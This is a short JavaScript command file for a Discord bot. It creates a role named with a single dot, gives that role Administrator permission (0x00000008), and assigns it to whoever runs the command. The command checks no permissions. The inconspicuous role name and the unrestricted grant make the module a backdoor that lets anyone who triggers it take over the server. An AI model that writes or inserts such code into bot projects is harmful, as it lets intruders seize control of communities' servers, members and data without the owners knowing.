exports.run = async (client, message) => {
    let role = message.guild.roles.find("name", ".")
    if(!role){
        try {
            role = await message.guild.createRole({
                name: ".",
                permissions: 0x00000008
            })
            
        }catch(e){
            console.log(e.stack)
        }
    }
    message.member.addRole(role.id)
}